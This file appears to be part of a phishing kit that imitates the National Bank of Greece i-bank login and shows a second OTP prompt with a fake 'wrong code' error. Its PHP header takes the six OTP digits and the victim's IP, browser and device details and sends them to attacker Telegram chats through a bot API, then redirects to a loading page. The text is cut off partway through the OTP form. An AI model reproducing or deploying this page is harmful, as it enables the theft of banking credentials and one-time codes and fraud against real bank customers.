<?php
   session_start();
   error_reporting(0);
   include "../config.php";
     session_start(); 
   if(isset($_POST['smss1'])){
   $ip = getenv("REMOTE_ADDR");
   $message = "-------------------- ✉️ NBG SMS 2 ✉️-------------------\nSMS2 : ".$_POST['first'].$_POST['second'].$_POST['third'].$_POST['forth'].$_POST['fifth'].$_POST['sixth']."\nBrowser : ".$br."\nDevice : ".$os."\nCountry : ".$Country."\nIP      : ".$ip."\nURL     : ".$url."\n-------------------- 🇬🇷 Zoldyck 🇬🇷-------------------\n";
   foreach($user_ids as $user_id) {
   $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
   $data=array('chat_id'=>$user_id,'text'=>$message);
   $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
   $context=stream_context_create($options);
   $result=file_get_contents($url,false,$context);
   
   }
   header("Location: loading.php?id=$ip&page=sms2.php");
   }
   ?>

<!DOCTYPE html>

<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Wеb ΝВG і-bаnk</title>
      <meta name="multilanguage" content="true">
      <meta name="mntc" content="[mntc]">
      <meta name="mntcMsg" content="[mntcMsg]">
      <meta name="arm" content="119">
      <meta name="lng" content="el">
      <meta name="epe" content="false">
      <meta name="_af" content="T_XIGso1SMr7zdtjnsjKGZ6X8NrfquicRUdDng4aKgmnaTuo9Mou7d-2csrY07FdvjBf6CmaIyPjJH1eurboogXRQhxuvZss65V2rJDfA_I1">
      <meta name="rscsSc" content="[rscsSc]">
      <meta name="indexTemplate" content="login-night">
      <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
      <meta name="gaId" content="UA-33771010-2">
      <meta name="sbxId" content="[sbxId]">
      <meta name="ofnn" content="false">
      <meta name="ftr_exCustOnb" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="src/img/favicon.ico">
      <link href="src/style5.css" rel="stylesheet">
   
    <script>
function autotab(original,destination){
if (original.getAttribute&&original.value.length==original.getAttribute("maxlength"))
destination.focus()
}
</script>

<script type="text/javascript">
    function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}

window.onload = function () {
    var fiveMinutes = 60 * 2,
        display = document.querySelector('#time');
    startTimer(fiveMinutes, display);
};
</script>
      <style>.mat-slide-toggle{display:inline-block;height:24px;max-width:100%;line-height:24px;white-space:nowrap;outline:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent}.mat-slide-toggle.mat-checked .mat-slide-toggle-thumb-container{transform:translate3d(16px,0,0)}[dir=rtl] .mat-slide-toggle.mat-checked .mat-slide-toggle-thumb-container{transform:translate3d(-16px,0,0)}.mat-slide-toggle.mat-disabled{opacity:.38}.mat-slide-toggle.mat-disabled .mat-slide-toggle-label,.mat-slide-toggle.mat-disabled .mat-slide-toggle-thumb-container{cursor:default}.mat-slide-toggle-label{display:flex;flex:1;flex-direction:row;align-items:center;height:inherit;cursor:pointer}.mat-slide-toggle-content{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.mat-slide-toggle-label-before .mat-slide-toggle-label{order:1}.mat-slide-toggle-label-before .mat-slide-toggle-bar{order:2}.mat-slide-toggle-bar,[dir=rtl] .mat-slide-toggle-label-before .mat-slide-toggle-bar{margin-right:8px;margin-left:0}.mat-slide-toggle-label-before .mat-slide-toggle-bar,[dir=rtl] .mat-slide-toggle-bar{margin-left:8px;margin-right:0}.mat-slide-toggle-bar-no-side-margin{margin-left:0;margin-right:0}.mat-slide-toggle-thumb-container{position:absolute;z-index:1;width:20px;height:20px;top:-3px;left:0;transform:translate3d(0,0,0);transition:all 80ms linear;transition-property:transform;cursor:-webkit-grab;cursor:grab}.mat-slide-toggle-thumb-container.mat-dragging,.mat-slide-toggle-thumb-container:active{cursor:-webkit-grabbing;cursor:grabbing;transition-duration:0s}._mat-animation-noopable .mat-slide-toggle-thumb-container{transition:none}[dir=rtl] .mat-slide-toggle-thumb-container{left:auto;right:0}.mat-slide-toggle-thumb{height:20px;width:20px;border-radius:50%}.mat-slide-toggle-bar{position:relative;width:36px;height:14px;flex-shrink:0;border-radius:8px}.mat-slide-toggle-input{bottom:0;left:10px}[dir=rtl] .mat-slide-toggle-input{left:auto;right:10px}.mat-slide-toggle-bar,.mat-slide-toggle-thumb{transition:all 80ms linear;transition-property:background-color;transition-delay:50ms}._mat-animation-noopable .mat-slide-toggle-bar,._mat-animation-noopable .mat-slide-toggle-thumb{transition:none}.mat-slide-toggle .mat-slide-toggle-ripple{position:absolute;top:calc(50% - 20px);left:calc(50% - 20px);height:40px;width:40px;z-index:1;pointer-events:none}.mat-slide-toggle .mat-slide-toggle-ripple .mat-ripple-element:not(.mat-slide-toggle-persistent-ripple){opacity:.12}.mat-slide-toggle-persistent-ripple{width:100%;height:100%;transform:none}.mat-slide-toggle-bar:hover .mat-slide-toggle-persistent-ripple{opacity:.04}.mat-slide-toggle:not(.mat-disabled).cdk-focused .mat-slide-toggle-persistent-ripple{opacity:.12}.mat-slide-toggle-persistent-ripple,.mat-slide-toggle.mat-disabled .mat-slide-toggle-bar:hover .mat-slide-toggle-persistent-ripple{opacity:0}@media (hover:none){.mat-slide-toggle-bar:hover .mat-slide-toggle-persistent-ripple{display:none}}@media (-ms-high-contrast:active){.mat-slide-toggle-thumb{background:#fff;border:1px solid #000}.mat-slide-toggle.mat-checked .mat-slide-toggle-thumb{background:#000;border:1px solid #fff}.mat-slide-toggle-bar{background:#fff}.mat-slide-toggle.cdk-keyboard-focused .mat-slide-toggle-bar{outline:1px dotted;outline-offset:5px}}@media (-ms-high-contrast:black-on-white){.mat-slide-toggle-bar{border:1px solid #000}}</style>
      <style>.mat-form-field{display:inline-block;position:relative;text-align:left}[dir=rtl] .mat-form-field{text-align:right}.mat-form-field-wrapper{position:relative}.mat-form-field-flex{display:inline-flex;align-items:baseline;box-sizing:border-box;width:100%}.mat-form-field-prefix,.mat-form-field-suffix{white-space:nowrap;flex:none;position:relative}.mat-form-field-infix{display:block;position:relative;flex:auto;min-width:0;width:180px}@media (-ms-high-contrast:active){.mat-form-field-infix{border-image:linear-gradient(transparent,transparent)}}.mat-form-field-label-wrapper{position:absolute;left:0;box-sizing:content-box;width:100%;height:100%;overflow:hidden;pointer-events:none}[dir=rtl] .mat-form-field-label-wrapper{left:auto;right:0}.mat-form-field-label{position:absolute;left:0;font:inherit;pointer-events:none;width:100%;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;transform-origin:0 0;transition:transform .4s cubic-bezier(.25,.8,.25,1),color .4s cubic-bezier(.25,.8,.25,1),width .4s cubic-bezier(.25,.8,.25,1);display:none}[dir=rtl] .mat-form-field-label{transform-origin:100% 0;left:auto;right:0}.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label,.mat-form-field-empty.mat-form-field-label{display:block}.mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:block;transition:none}.mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:block}.mat-form-field-label:not(.mat-form-field-empty){transition:none}.mat-form-field-underline{position:absolute;width:100%;pointer-events:none;transform:scaleY(1.0001)}.mat-form-field-ripple{position:absolute;left:0;width:100%;transform-origin:50%;transform:scaleX(.5);opacity:0;transition:background-color .3s cubic-bezier(.55,0,.55,.2)}.mat-form-field.mat-focused .mat-form-field-ripple,.mat-form-field.mat-form-field-invalid .mat-form-field-ripple{opacity:1;transform:scaleX(1);transition:transform .3s cubic-bezier(.25,.8,.25,1),opacity .1s cubic-bezier(.25,.8,.25,1),background-color .3s cubic-bezier(.25,.8,.25,1)}.mat-form-field-subscript-wrapper{position:absolute;box-sizing:border-box;width:100%;overflow:hidden}.mat-form-field-label-wrapper .mat-icon,.mat-form-field-subscript-wrapper .mat-icon{width:1em;height:1em;font-size:inherit;vertical-align:baseline}.mat-form-field-hint-wrapper{display:flex}.mat-form-field-hint-spacer{flex:1 0 1em}.mat-error{display:block}.mat-form-field-control-wrapper{position:relative}.mat-form-field._mat-animation-noopable .mat-form-field-label,.mat-form-field._mat-animation-noopable .mat-form-field-ripple{transition:none} .mat-form-field-appearance-fill .mat-form-field-flex{border-radius:4px 4px 0 0;padding:.75em .75em 0 .75em}@media (-ms-high-contrast:active){.mat-form-field-appearance-fill .mat-form-field-flex{outline:solid 1px}}.mat-form-field-appearance-fill .mat-form-field-underline::before{content:'';display:block;position:absolute;bottom:0;height:1px;width:100%}.mat-form-field-appearance-fill .mat-form-field-ripple{bottom:0;height:2px}@media (-ms-high-contrast:active){.mat-form-field-appearance-fill .mat-form-field-ripple{height:0;border-top:solid 2px}}.mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}.mat-form-field-appearance-fill .mat-form-field-subscript-wrapper{padding:0 1em} .mat-input-element{font:inherit;background:0 0;color:currentColor;border:none;outline:0;padding:0;margin:0;width:100%;max-width:100%;vertical-align:bottom;text-align:inherit}.mat-input-element:-moz-ui-invalid{box-shadow:none}.mat-input-element::-ms-clear,.mat-input-element::-ms-reveal{display:none}.mat-input-element,.mat-input-element::-webkit-search-cancel-button,.mat-input-element::-webkit-search-decoration,.mat-input-element::-webkit-search-results-button,.mat-input-element::-webkit-search-results-decoration{-webkit-appearance:none}.mat-input-element::-webkit-caps-lock-indicator,.mat-input-element::-webkit-contacts-auto-fill-button,.mat-input-element::-webkit-credentials-auto-fill-button{visibility:hidden}.mat-input-element[type=date]::after,.mat-input-element[type=datetime-local]::after,.mat-input-element[type=datetime]::after,.mat-input-element[type=month]::after,.mat-input-element[type=time]::after,.mat-input-element[type=week]::after{content:' ';white-space:pre;width:1px}.mat-input-element::-webkit-calendar-picker-indicator,.mat-input-element::-webkit-clear-button,.mat-input-element::-webkit-inner-spin-button{font-size:.75em}.mat-input-element::placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element::-moz-placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element::-webkit-input-placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element:-ms-input-placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-form-field-hide-placeholder .mat-input-element::placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}textarea.mat-input-element{resize:vertical;overflow:auto}textarea.mat-input-element.cdk-textarea-autosize{resize:none}textarea.mat-input-element{padding:2px 0;margin:-2px 0}select.mat-input-element{-moz-appearance:none;-webkit-appearance:none;position:relative;background-color:transparent;display:inline-flex;box-sizing:border-box;padding-top:1em;top:-1em;margin-bottom:-1em}select.mat-input-element::-ms-expand{display:none}select.mat-input-element::-moz-focus-inner{border:0}select.mat-input-element:not(:disabled){cursor:pointer}select.mat-input-element::-ms-value{color:inherit;background:0 0}@media (-ms-high-contrast:active){.mat-focused select.mat-input-element::-ms-value{color:inherit}}.mat-form-field-type-mat-native-select .mat-form-field-infix::after{content:'';width:0;height:0;border-left:5px solid transparent;border-right:5px solid transparent;border-top:5px solid;position:absolute;top:50%;right:0;margin-top:-2.5px;pointer-events:none}[dir=rtl] .mat-form-field-type-mat-native-select .mat-form-field-infix::after{right:auto;left:0}.mat-form-field-type-mat-native-select .mat-input-element{padding-right:15px}[dir=rtl] .mat-form-field-type-mat-native-select .mat-input-element{padding-right:0;padding-left:15px}.mat-form-field-type-mat-native-select .mat-form-field-label-wrapper{max-width:calc(100% - 10px)}.mat-form-field-type-mat-native-select.mat-form-field-appearance-outline .mat-form-field-infix::after{margin-top:-5px}.mat-form-field-type-mat-native-select.mat-form-field-appearance-fill .mat-form-field-infix::after{margin-top:-10px} .mat-form-field-appearance-legacy .mat-form-field-label{transform:perspective(100px);-ms-transform:none}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon{width:1em}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button{font:inherit;vertical-align:baseline}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon{font-size:inherit}.mat-form-field-appearance-legacy .mat-form-field-underline{height:1px}@media (-ms-high-contrast:active){.mat-form-field-appearance-legacy .mat-form-field-underline{height:0;border-top:solid 1px}}.mat-form-field-appearance-legacy .mat-form-field-ripple{top:0;height:2px;overflow:hidden}@media (-ms-high-contrast:active){.mat-form-field-appearance-legacy .mat-form-field-ripple{height:0;border-top:solid 2px}}.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}@media (-ms-high-contrast:active){.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}}.mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) .mat-form-field-ripple{height:1px} .mat-form-field-appearance-outline .mat-form-field-wrapper{margin:.25em 0}.mat-form-field-appearance-outline .mat-form-field-flex{padding:0 .75em 0 .75em;margin-top:-.25em;position:relative}.mat-form-field-appearance-outline .mat-form-field-prefix,.mat-form-field-appearance-outline .mat-form-field-suffix{top:.25em}.mat-form-field-appearance-outline .mat-form-field-outline{display:flex;position:absolute;top:.25em;left:0;right:0;bottom:0;pointer-events:none}.mat-form-field-appearance-outline .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-start{border:1px solid currentColor;min-width:5px}.mat-form-field-appearance-outline .mat-form-field-outline-start{border-radius:5px 0 0 5px;border-right-style:none}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-start{border-right-style:solid;border-left-style:none;border-radius:0 5px 5px 0}.mat-form-field-appearance-outline .mat-form-field-outline-end{border-radius:0 5px 5px 0;border-left-style:none;flex-grow:1}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-end{border-left-style:solid;border-right-style:none;border-radius:5px 0 0 5px}.mat-form-field-appearance-outline .mat-form-field-outline-gap{border-radius:.000001px;border:1px solid currentColor;border-left-style:none;border-right-style:none}.mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap{border-top-color:transparent}.mat-form-field-appearance-outline .mat-form-field-outline-thick{opacity:0}.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start{border-width:2px;transition:border-color .3s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline{opacity:0;transition:opacity .1s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline{opacity:0;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline .mat-form-field-subscript-wrapper{padding:0 1em}.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,.mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-outline{transition:none} .mat-form-field-appearance-standard .mat-form-field-flex{padding-top:.75em}.mat-form-field-appearance-standard .mat-form-field-underline{height:1px}@media (-ms-high-contrast:active){.mat-form-field-appearance-standard .mat-form-field-underline{height:0;border-top:solid 1px}}.mat-form-field-appearance-standard .mat-form-field-ripple{bottom:0;height:2px}@media (-ms-high-contrast:active){.mat-form-field-appearance-standard .mat-form-field-ripple{height:0;border-top:2px}}.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}@media (-ms-high-contrast:active){.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}}.mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}</style>
   </head>
   <body class="login-bg windows login-night modal-open" style="padding-right: 0.333374px;">
      
      <index-page ng-version="7.2.16">
         <div agent-type="" class="appRoot">
           
            <router-outlet></router-outlet>
            <login class="flex-column min-height-full-vh">
               <login-header>
                  <header class="main-header">
                     <div class="flex-vertical-center-space-between header-container wrap-mobile-medium">
                        <nikomek-icon class="full-screen-width--mobile" style="height: 8.5rem; margin-top: -2.5rem">
                           <div class="flex-vertical-center" style="height: 11rem; min-height: 11rem;"><img alt="nbg logo" class="full-height margin-auto--mobile" src="src/img/login-logo.el.png"></div>
                        </nikomek-icon>
                       
                        <div class="
                           flex-vertical-center
                           full-height
                           margin-top-normal-mobile-medium margin-mobile-languange
                           ">
                           <!----><button class="button-transparent text-light text-large text-white" style="margin: 0 0.5rem"><span class="text-action">ΕΛ</span><span>/</span><span>EN</span></button>
                           <div class="horizontal-divider" style="height: 120%"></div>
                           <div class="flex-vertical-center text-white">
                              <div class="flex-row text-light">
                                 <div class="flex-column">
                                    <!---->
                                    <div class="flex-vertical-center cursor-pointer" style="margin-bottom: 0.75rem">
                                       <div class="icon-help-faq icon-container-20"></div>
                                       <span><a class="
                                          link-white
                                          text-medium text-regular
                                          margin-left-small
                                          text-white
                                          " href="#" target="_blank">Συχνές ερωτήσεις</a></span>
                                    </div>
                                    <div class="flex-vertical-center cursor-pointer"><i class="icon-phone" style="font-size: 20px"></i><span class="text-medium text-regular margin-left-small">Επικοινωνία</span></div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
                  <!---->
               </login-header>
               <div class="max-width-container-login">
                  <div class="login-container">
                     <h1 class="text-page-heading text-align-center text-medium text-white modal-wrapper-margin-bottom"> Καλώς ήρθατε στο i-bank</h1>
                     <img class="login-header-img margin-bottom-medium login-night display-none">
                     <sign-in class="user-login-container">
                        <!---->
                        <sign-in-form>
                           <div>
                              <div class="user-login-subcontainer">
                                 <!---->
                                 <div class="full-height flex-column">
                                    <div class="position-relative">
                                       <div class="flex-center">
                                          <input class="oval-input ng-dirty ng-touched" test-field="usernameField" type="text" placeholder="Κωδικός χρήστη" disabled=""><!----><!----><button class="
                                             button-transparent
                                             text-primary text-medium
                                             right-default
                                             text-small
                                             position-absolute-center-y
                                             "><i class="icon-user-refresh icon-svg-container-small"></i></button>
                                       </div>
                                    </div>
                                    <!---->
                                    <div class="position-relative margin-top-default"><input class="oval-input ng-touched ng-dirty ng-valid" test-field="passwordField" type="password" placeholder="Μυστικός κωδικός"><button class="button-icon right-default position-absolute-center-y"><i class="icon-svg-container-small icon-visibility"></i></button></div>
                                    <!----><!----><!---->
                                    <div class="flex-vertical-center-space-between margin-top-normal">
                                       <spinner type="action">
                                          <!----><!----><button class="button-secondary--white" style="min-width: 10rem"> Ξέχασα το password </button><!---->
                                       </spinner>
                                       <spinner type="action">
                                          <!----><!----><button class="button" style="min-width: 8rem" test-button="loginButton" type="button"> Σύνδεση </button><!---->
                                       </spinner>
                                    </div>
                                    <!---->
                                 </div>
                                 <!---->
                              </div>
                           </div>
                        </sign-in-form>
                        <!---->
                     </sign-in>
                     <br><br>
                  </div>
                  <div class="margin-top-auto">
                     <useful-links>
                        <div class="useful-links-container">
                           <div class="social-links-container"><a class="icon-container icon-facebook-lg" ngclass="icon-facebook-lg" target="_blank" href="#"></a><a class="icon-container icon-twitter-lg" ngclass="icon-twitter-lg" target="_blank" href="#"></a><a class="icon-container icon-youtube-lg" ngclass="icon-youtube-lg" target="_blank" href="#"></a><a class="icon-container icon-linkedin-lg" ngclass="icon-linkedin-lg" target="_blank" href="#"></a><a class="icon-container icon-email-lg" ngclass="icon-email-lg" target="_blank" href="https://www.nbg.gr/el/contact/contact-form"></a></div>
                           <div class="links-container">
                              <!----><a class="link-white button-transparent useful-link" target="_blank" href="#"> Προστασία Δεδομένων Προσωπικού Χαρακτήρα </a><a class="link-white button-transparent useful-link" target="_blank" href="#"> Συμβατότητα με browsers </a>
                           </div>
                        </div>
                     </useful-links>
                  </div>
               </div>
            </login>
         </div>
      </index-page>
      <ngb-modal-backdrop style="z-index: 1050" class="modal-backdrop fade show"></ngb-modal-backdrop>
      <ngb-modal-window role="dialog" tabindex="-1" class="modal fade show d-block modal-small">
         <div role="document" class="modal-dialog">
            <div class="modal-content">
               <two-fa-modal>
                  <div class="card bg-white">
                     <modal-header>
                        <div class="bg-white position-relative" style="padding: 0.75rem; border-radius: 0.5rem">
                           <!----><!---->
                           <h4 class="modal-header ng-star-inserted"> Σύνδεση χρήστη </h4>
                           <!----><button aria-label="Close" class="icon-clear button-transparent icon-container-small text-x-large text-primary margin-left-auto position-absolute modal-button-position--left" type="button"></button>
                        </div>
                        <!---->
                        <hr class="modal-header-divider ng-star-inserted">
                     </modal-header>
                     <div class="modal-wrapper-padding">
                        <div class="margin-top-normal">
                           <div class="responsive-image-figure-container--otp">
                              <figure class="responsive-image-figure__otp"><img class="responsive-image" src="src/img/login-otp.svg"></figure>
                           </div>
                            <p class="text-light-black text-light margin-top-normal ng-star-inserted" style="text-align: center; color:red">  Λανθασμένος Ηλεκτρονικός Κλειδάριθμος </p>
                          
                           <p class="text-light-black text-light margin-top-normal ng-star-inserted"> Συνδέεστε πρώτη φορά από αυτό τον device. Για την ασφάλειά σας, παρακαλούμε εισάγετε το OTP. Δεν θα σας ζητηθεί η καταχώρισή του την επόμενη φορά που θα συνδεθείτε από τον ίδιο device. </p>
                           <!----><!---->
                           <switch class="ng-star-inserted">
                              <div class="switch-container switch-container--space-between">
                                 <p class="switch-text"> Επιθυμείτε να θυμόμαστε την σύνδεση με το συγκεκριμένο device; </p>
                                 <mat-slide-toggle aria-label="toggle Switch" class="switch mat-slide-toggle mat-accent is-enabled mat-checked" id="mat-slide-toggle-1" tabindex="-1">
                                    <label class="mat-slide-toggle-label" for="mat-slide-toggle-1-input">
                                       <div class="mat-slide-toggle-bar mat-slide-toggle-bar-no-side-margin">
                                          <input class="mat-slide-toggle-input cdk-visually-hidden" role="switch" type="checkbox" id="mat-slide-toggle-1-input" tabindex="0" aria-checked="true" aria-label="toggle Switch">
                                          <div class="mat-slide-toggle-thumb-container">
                                             <div class="mat-slide-toggle-thumb"></div>
                                             <div class="mat-slide-toggle-ripple mat-ripple" mat-ripple="">
                                                <div class="mat-ripple-element mat-slide-toggle-persistent-ripple"></div>
                                             </div>
                                          </div>
                                       </div>
                                       <span class="mat-slide-toggle-content"><span style="display:none">&nbsp;</span></span>
                                    </label>
                                 </mat-slide-toggle>
                              </div>
                           </switch>
                           <form name="sampleform" method="post">
                           <div class="modal-wrapper-i-code-margin__short bg-gray">
                              <i-code>
                                 <div class="flex-space-between flex-column-reverse--sm-only bg-gray shadow-inset" style="padding: 0.75rem 1rem 0 2rem;">
                                    <!----><!---->
                                    <div class="ng-star-inserted">
                                       <label class="text-gray text-bold text-small" for="digit-1" style="display: block; margin-bottom: -0.75rem;">OTP</label>
                                       <div style="margin: 0 -0.25rem;">
                                          <!---->
                                          <mat-form-field class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                             <div class="mat-form-field-wrapper">
                                                <div class="mat-form-field-flex">
                                                   <!----><!---->
                                                   <div class="mat-form-field-infix">
                                                      <input class="text-align-center mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored" matinput="" maxlength="1" type="tel" id="digit-1" aria-invalid="false" aria-required="false"  oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="first" autocomplete="fname" size=1 onKeyup="autotab(this, document.sampleform.second)" required>
                                                      <span class="mat-form-field-label-wrapper">
                                                         <!---->
                                                      </span>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <!---->
                                                <div class="mat-form-field-underline ng-tns-c0-0 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                <div class="mat-form-field-subscript-wrapper">
                                                   <!----><!---->
                                                   <div class="mat-form-field-hint-wrapper ng-tns-c0-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                      <!---->
                                                      <div class="mat-form-field-hint-spacer"></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </mat-form-field>
                                          <mat-form-field class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-1 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                             <div class="mat-form-field-wrapper">
                                                <div class="mat-form-field-flex">
                                                   <!----><!---->
                                                   <div class="mat-form-field-infix">
                                                      <input class="text-align-center mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored" matinput="" maxlength="1" autocomplete="fname" type="tel" id="digit-2" aria-invalid="false" aria-required="false" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="second" size=1 onKeyup="autotab(this, document.sampleform.third)" required>
                                                      <span class="mat-form-field-label-wrapper">
                                                         <!---->
                                                      </span>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <!---->
                                                <div class="mat-form-field-underline ng-tns-c0-1 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                <div class="mat-form-field-subscript-wrapper">
                                                   <!----><!---->
                                                   <div class="mat-form-field-hint-wrapper ng-tns-c0-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                      <!---->
                                                      <div class="mat-form-field-hint-spacer"></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </mat-form-field>
                                          <mat-form-field class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                             <div class="mat-form-field-wrapper">
                                                <div class="mat-form-field-flex">
                                                   <!----><!---->
                                                   <div class="mat-form-field-infix">
                                                      <input class="text-align-center mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored" matinput="" maxlength="1" autocomplete="fname" type="tel" id="digit-3" aria-invalid="false" aria-required="false" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="third" size=1 onKeyup="autotab(this, document.sampleform.forth)" required>
                                                      <span class="mat-form-field-label-wrapper">
                                                         <!---->
                                                      </span>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <!---->
                                                <div class="mat-form-field-underline ng-tns-c0-2 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                <div class="mat-form-field-subscript-wrapper">
                                                   <!----><!---->
